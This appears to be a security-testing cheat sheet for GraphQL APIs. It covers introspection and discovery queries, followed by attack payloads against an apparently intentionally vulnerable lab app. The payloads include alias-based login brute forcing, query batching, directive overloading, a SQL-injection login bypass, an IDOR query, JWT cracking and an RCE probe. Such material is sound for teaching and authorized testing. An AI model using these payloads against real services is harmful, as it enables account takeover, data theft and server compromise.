# Discovery

## GraphQL Common Paths wordlist
https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/graphql.txt


## Discover the Root Object Types

The GraphQL server typically exposes Query & Mutation as root types, and running these queries helps you understand that structure.

### Query (for getting the root object type)

This query simply returns the type name of the root object in the query:

```graphql
query {
  __typename
}
```

### Mutation (for getting the mutation root object type)

This query simply returns the type name of the root object in the mutation:

```graphql
mutation { 
  __typename
}
```

### Subscription (for getting the subscription root object type)

This query simply returns the type name of the root object in the mutation:

```graphql
subscription { 
  __typename
}
```

## Introspection

Introspection queries are a standardized way to retrieve the entire GraphQL schema, and often, they're enabled on GraphQL APIs (sometimes intentionally, sometimes accidentally). This can expose all the data types, fields, and relationships in the schema.

This is very similar to the information_schema tables in modern databases. It helps users know what is available.

### Query (to get all available queries)

```graphql
{
  __type(name: "Query") {
    fields {
      name
      description
    }
  }
}
```

### Query (to get all available mutations)

```graphql
{
  __type(name: "Mutation") {
    fields {
      name
      description
    }
  }
}
```

### Query (to get all available subscriptions)

```graphql
{
  __type(name: "Subscripitions") {
    fields {
      name
      description
    }
  }
}
```

## Field Suggestions

```graphql
{
  users {
    userid
  }
}
```

```graphql
{
  users {
    username
  }
}
```

```graphql
{
  users {
    useremail
  }
}
```

### Full Introspection Query

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}

fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name description type { ...TypeRef } defaultValue
}

fragment TypeRef on __Type {
  kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } }
}
```

## Use Clairvoyance when introspection is disabled

```sh
clairvoyance http://localhost:4000 --progress -o graphql -c 1
```

## Use GraphQL-Cop to find the misconfigurations in GraphQL implementation

### GraphQL-COP Misconfiguration analysis

#### Bruteforcing login mutation using Alias Overloading

```graphql
mutation {
  login1: login(email: "peter@hack.org", password: "!13ep@re2")
  login2: login(email: "peter@hack.org", password: "31e!rte2@")
  login3: login(email: "peter@hack.org", password: "@pt3r1e!2")
  login4: login(email: "peter@hack.org", password: "1e2!te@p3")
  login5: login(email: "peter@hack.org", password: "31rpet!2e")
  login6: login(email: "peter@hack.org", password: "@tep!re32")
  login7: login(email: "peter@hack.org", password: "peter@123!")
  login8: login(email: "peter@hack.org", password: "!e3re@t1p")
  login9: login(email: "peter@hack.org", password: "1pe@!32te")
  login10: login(email: "peter@hack.org", password: "r3etpe!@2")
}
```

#### Array-based Query Batching

```json
[
  { "query": "query Batch1 { users { name email } }" },
  { "query": "query Batch2 { events { name description } }" },
  { "query": "query Batch3 { users { name createdAt } }" },
  { "query": "query Batch4 { events { name event_id } }" },
  { "query": "query Batch5 { users { name phone } }" },
  { "query": "query Batch6 { events { name createdAt } }" },
  { "query": "query Batch7 { users { name isAdmin } }" },
  { "query": "query Batch8 { events { name description createdAt } }" },
  { "query": "query Batch9 { users { name user_id password} }" },
  { "query": "query Batch10 { events { name event_id description } }" },
  { "query": "query Batch11 { users { name email } }" },
  { "query": "query Batch12 { events { name description } }" },
  { "query": "query Batch13 { users { name createdAt } }" },
  { "query": "query Batch14 { events { name event_id } }" },
  { "query": "query Batch15 { users { name phone } }" },
  { "query": "query Batch16 { events { name createdAt } }" },
  { "query": "query Batch17 { users { name isAdmin } }" },
  { "query": "query Batch18 { events { name description createdAt } }" },
  { "query": "query Batch19 { users { name user_id password} }" },
  { "query": "query Batch20 { events { name event_id description } }" }
]
```

```json
[
  {
    "query": "mutation { register(name: \"mrroot\", email: \"mrroot@hack.org\", phone: \"7894561230\", password: \"Mrroot123\") }"
  },
  {
    "query": "mutation { login(email: \"mrroot@hack.org\", password: \"Mrroot123\") }"
  },
  {
    "query": "query { users { user_id name }}"
  }
]
```

#### Directive Overloading

```json
{"query": "query cop { __typename @hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack@hack }" }
```

## Vulnerabilities

#### 1. Full Information disclosure of user details via Introspection Leak

```graphql
{
  users {
    user_id
    name
    email
    phone
    isAdmin
    password
    createdAt
  }
}
```

#### 2. SQL Injection at Login

```graphql
mutation {
  login(email: "peter@hack.org'--", password: "string")
}
```

#### 3. IDOR at Userdetails Query

```graphql
{
  user(user_id: "b9b854c0-ef42-11ef-9332-9f36ccc8fdcd") {
    name
    email
    phone
    password
  }
}
```
#### 4. Cracking JWT to become Admin user
1. Visit https://jwt-cracker.online/ and paste the JWT Choose the Scraped-JWT-Secrets.txt
   
   <img width="1419" alt="image" src="https://github.com/user-attachments/assets/a78d590b-8398-4f72-8486-d766e9b08f9d" />


#### 5. RCE at SystemHealth Query

```graphql
{
  systemHealth(input: "uptime")
}
```
